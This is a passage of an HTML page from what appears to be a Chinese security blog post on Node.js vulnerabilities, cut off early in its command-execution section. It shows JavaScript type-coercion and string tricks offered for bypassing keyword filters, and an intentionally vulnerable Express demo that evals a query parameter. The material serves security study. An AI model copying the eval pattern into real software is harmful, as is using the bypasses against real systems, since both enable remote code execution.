@@ -1,0 +1,934 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Nodejs漏洞学习 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%89%B9%E6%80%A7"><span class="toc-number">2.</span> <span class="toc-text">特性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-number">2.1.</span> <span class="toc-text">弱类型比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.2.</span> <span class="toc-text">变量拼接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ES6%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.3.</span> <span class="toc-text">ES6模板字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-number">2.4.</span> <span class="toc-text">单引号和反引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-number">2.5.</span> <span class="toc-text">大小写特性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eval"><span class="toc-number">3.1.</span> <span class="toc-text">eval()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#child-process"><span class="toc-number">3.2.</span> <span class="toc-text">child_process</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exec-amp-execSync"><span class="toc-number">3.2.1.</span> <span class="toc-text">exec() &amp; execSync()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#execFile"><span class="toc-number">3.2.2.</span> <span class="toc-text">execFile()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fork"><span class="toc-number">3.2.3.</span> <span class="toc-text">fork()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#spawn-amp-spawnSync"><span class="toc-number">3.2.4.</span> <span class="toc-text">spawn() &amp; spawnSync()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4require"><span class="toc-number">3.3.</span> <span class="toc-text">过滤require</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setIntval"><span class="toc-number">3.4.</span> <span class="toc-text">setIntval()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setTimeout"><span class="toc-number">3.5.</span> <span class="toc-text">setTimeout()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA"><span class="toc-number">3.5.1.</span> <span class="toc-text">整型溢出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Function"><span class="toc-number">3.6.</span> <span class="toc-text">Function()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">3.7.</span> <span class="toc-text">bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-number">3.7.1.</span> <span class="toc-text">16进制编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode%E7%BC%96%E7%A0%81"><span class="toc-number">3.7.2.</span> <span class="toc-text">unicode编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%8F%B7%E6%8B%BC%E6%8E%A5"><span class="toc-number">3.7.3.</span> <span class="toc-text">加号拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">3.7.4.</span> <span class="toc-text">模板字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#concat%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.7.5.</span> <span class="toc-text">concat连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81"><span class="toc-number">3.7.6.</span> <span class="toc-text">base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Obejct-keys"><span class="toc-number">3.7.7.</span> <span class="toc-text">Obejct.keys</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflect"><span class="toc-number">3.7.8.</span> <span class="toc-text">Reflect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.7.9.</span> <span class="toc-text">过滤中括号</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">4.</span> <span class="toc-text">基础原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">4.1.</span> <span class="toc-text">原型链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#merge%E6%93%8D%E4%BD%9C"><span class="toc-number">4.3.</span> <span class="toc-text">merge操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-1"><span class="toc-number">4.4.</span> <span class="toc-text">bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#proto-%E8%BF%87%E6%BB%A4"><span class="toc-number">4.4.1.</span> <span class="toc-text">__proto__过滤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Undefsafe%E6%A8%A1%E5%9D%97%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">5.</span> <span class="toc-text">Undefsafe模块原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">6.</span> <span class="toc-text">ejs原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#safe-obj%E6%B1%A1%E6%9F%93%EF%BC%88CVE-2021-25928%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">safe-obj污染（CVE-2021-25928）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vm%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-number">8.</span> <span class="toc-text">vm沙盒逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">8.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.2.</span> <span class="toc-text">漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Ethis"><span class="toc-number">8.2.1.</span> <span class="toc-text">关于this</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-2"><span class="toc-number">8.3.</span> <span class="toc-text">bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#this%E4%B8%BAnull"><span class="toc-number">8.3.1.</span> <span class="toc-text">this为null</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proxy%E5%8A%AB%E6%8C%81"><span class="toc-number">8.3.2.</span> <span class="toc-text">proxy劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E5%8A%A9%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="toc-number">8.3.3.</span> <span class="toc-text">借助异常处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vm2"><span class="toc-number">9.</span> <span class="toc-text">vm2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#serialize%E6%A8%A1%E5%9D%97%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.</span> <span class="toc-text">serialize模块反序列化漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nodejs-HTTP%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB"><span class="toc-number">11.</span> <span class="toc-text">Nodejs HTTP拆分攻击</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>Nodejs漏洞学习</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/6/29
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Nodejs/" style="color: #ffa2c4">Nodejs</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" style="color: #03a9f4">沙箱逃逸</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">4.7k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">20分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>目前包括语言特性，命令执行，原型链污染，vm沙箱逃逸，反序列化</p>
+<p>部分trick已单独拆分为一篇文章</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1561">https://forum.butian.net/share/1561</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-12">https://xz.aliyun.com/t/7184#toc-12</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/">https://boogipop.com/2023/03/02/Node.Js%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zer0peach.github.io/2023/11/20/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/">https://zer0peach.github.io/2023/11/20/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p>
+<span id="more"></span>
+
+<h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><p>和php一样存在弱类型的特性</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token number">1</span><span class="token operator">==</span><span class="token string">'1'</span>
+<span class="token boolean">true</span>
+<span class="token operator">></span> <span class="token number">1</span><span class="token operator">></span><span class="token string">'2'</span>
+<span class="token boolean">false</span>
+<span class="token operator">></span> <span class="token string">'1'</span><span class="token operator">&lt;</span><span class="token string">'2'</span>
+<span class="token boolean">true</span>
+<span class="token operator">></span> <span class="token number">111</span><span class="token operator">></span><span class="token string">'3'</span>
+<span class="token boolean">true</span>
+<span class="token operator">></span> <span class="token string">'111'</span><span class="token operator">&lt;</span><span class="token string">'3'</span>
+<span class="token boolean">true</span>
+<span class="token operator">></span> <span class="token string">'asd'</span><span class="token operator">></span><span class="token number">1</span>
+<span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>数字与数字字符串比较时，数字型字符串会被强转为数字之后比较<br>字符串与字符串比较，比第一个ASCII码</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token boolean">false</span>
+<span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token boolean">false</span>
+<span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>
+<span class="token boolean">false</span>
+<span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token string">'aaa'</span>
+<span class="token boolean">false</span>
+<span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">'2'</span>
+<span class="token boolean">true</span>
+<span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">"10"</span>
+<span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>空数组比较为false<br>数组之间比较第一个值，如果有字符串取第一个比较<br>数组永远比非数值型字符串小</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token keyword">null</span><span class="token operator">==</span><span class="token keyword">undefined</span>
+<span class="token boolean">true</span>
+<span class="token operator">></span> <span class="token keyword">null</span><span class="token operator">===</span><span class="token keyword">undefined</span>
+<span class="token boolean">false</span>
+<span class="token operator">></span> <span class="token number">NaN</span><span class="token operator">==</span><span class="token number">NaN</span>
+<span class="token boolean">false</span>
+<span class="token operator">></span> <span class="token number">NaN</span><span class="token operator">===</span><span class="token number">NaN</span>
+<span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>null弱等于undefined，NaN不等于NaN</p>
+<hr>
+<h2 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token number">5</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>
+<span class="token string">'56,6'</span>
+<span class="token operator">></span> <span class="token string">"5"</span><span class="token operator">+</span><span class="token number">6</span>
+<span class="token string">'56'</span>
+<span class="token operator">></span> <span class="token string">"5"</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>
+<span class="token string">'56,6'</span>
+<span class="token operator">></span> <span class="token string">"5"</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"6"</span><span class="token punctuation">]</span>
+<span class="token string">'56,6'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>数字或字符串跟数组，会和数组中的第一个元素进行拼接，返回的是字符串，拼接的元素与原来的元素之间用<code>,</code>分隔</p>
+<p>调用方法时可以用<code>中括号 + 字符串</code>的形式拼接来绕过某些限制</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span> console<span class="token punctuation">[</span><span class="token string">'l'</span><span class="token operator">+</span><span class="token string">'og'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ciallo'</span><span class="token punctuation">)</span>
+ciallo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="ES6模板字符串"><a href="#ES6模板字符串" class="headerlink" title="ES6模板字符串"></a>ES6模板字符串</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> ranker <span class="token operator">=</span> <span class="token string">"top"</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hello %s"</span><span class="token punctuation">,</span>kino<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231015113637396.png" alt="image-20231015113637396"></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">hello</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>ranker<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">world</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20231015113814528.png" alt="image-20231015113814528"></p>
+<p>利用模板字符串或许可以用来bypass一些关键词的过滤</p>
+<hr>
+<h2 id="单引号和反引号"><a href="#单引号和反引号" class="headerlink" title="单引号和反引号"></a>单引号和反引号</h2><p>在nodejs中反引号可以用来替代单引号</p>
+<h2 id="大小写特性"><a href="#大小写特性" class="headerlink" title="大小写特性"></a>大小写特性</h2><p>对于<code>toUpperCase()</code>：字符”ı”、”ſ” 经过toUpperCase处理后结果为 “I”、”S”</p>
+<p>对于<code>toLowerCase()</code>：字符”K”经过toLowerCase处理后结果为”k”(这个K不是K)</p>
+<hr>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p><a target="_blank" rel="noopener" href="https://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback">更多方法请移步官方文档</a></p>
+<h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>和PHP中eval函数一样，eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
+<p>demo：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/eval'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">var</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:8888/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="child-process"><a href="#child-process" class="headerlink" title="child_process"></a>child_process</h2><blockquote>
+<p>nodejs中用来执行系统命令的模块</p>
+</blockquote>
+<p>以下几个函数底层均为调用 spawn</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> child <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">cwd</span><span class="token operator">:</span> options<span class="token punctuation">.</span>cwd<span class="token punctuation">,</span>
+  <span class="token literal-property property">env</span><span class="token operator">:</span> options<span class="token punctuation">.</span>env<span class="token punctuation">,</span>
+  <span class="token literal-property property">gid</span><span class="token operator">:</span> options<span class="token punctuation">.</span>gid<span class="token punctuation">,</span>
